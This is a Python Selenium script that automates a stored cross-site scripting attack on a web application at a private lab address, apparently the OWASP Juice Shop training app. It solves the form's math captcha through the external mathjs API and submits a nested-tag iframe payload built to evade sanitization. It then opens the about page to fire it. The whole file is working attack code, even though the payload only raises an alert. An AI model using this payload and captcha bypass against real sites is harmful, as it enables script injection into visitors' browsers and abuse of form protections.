from selenium import webdriver
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys

import requests
import json

def get_browser():
    return webdriver.Chrome()

def closing_welcome_button(browser):
    closing_welcome_button = browser.find_element(By.CSS_SELECTOR, "button[aria-label='Close Welcome Banner']")
    action = ActionChains(browser)
    action.click(on_element = closing_welcome_button)
    action.perform()


def solveCaptcha2(captcha):
    api_url = "https://api.mathjs.org/v4/"
    expression = captcha

    response = requests.post(api_url, data=json.dumps({"expr": expression}), headers={"Content-Type": "application/json"})

    if response.status_code == 200:
        result = response.json()
        return result['result']
    else:
        print("Error:", response.status_code)


def serverSideXSS(browser, url):
    print('Popping reflected XSS in browser...')
    browser.get(url)
    sleep(3)
    closing_welcome_button(browser)
    payload = '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'

    input_comment = browser.find_element(By.ID, 'comment')
    captcha = browser.find_element(By.ID, 'captcha').text
    captchaResult = solveCaptcha2(captcha)
    input_captcha = browser.find_element(By.ID, 'captchaControl')
    submit_btn = browser.find_element(By.ID, 'submitButton')
    rating_btn = browser.find_element(By.CLASS_NAME, 'mat-slider-thumb')

    actions = ActionChains(browser)
    actions.send_keys_to_element(input_comment, payload)
    actions.send_keys_to_element(input_captcha, captchaResult)
    actions.click(rating_btn)
    actions.click(submit_btn)
    actions.perform()
    aboutURL = url.replace("contact", "about")
    sleep(3)
    browser.get(aboutURL)
    sleep(5)
    browser.quit()

url = 'http://192.168.55.132:3000/#/contact'
serverSideXSS(get_browser(), url)



